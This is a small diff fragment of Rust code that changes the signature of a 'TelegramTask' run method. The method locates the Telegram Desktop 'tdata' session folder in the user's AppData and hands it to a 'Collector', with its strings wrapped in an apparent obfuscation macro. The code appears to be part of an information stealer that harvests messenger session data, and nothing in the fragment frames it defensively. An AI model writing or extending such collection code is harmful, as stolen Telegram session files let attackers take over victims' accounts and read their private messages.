@@ -8,7 +8,7 @@ use utils::path::Path;
 pub(super) struct TelegramTask;
 
 impl<C: Collector> Task<C> for TelegramTask {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let appdata = &Path::appdata();
         let paths = [
             (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
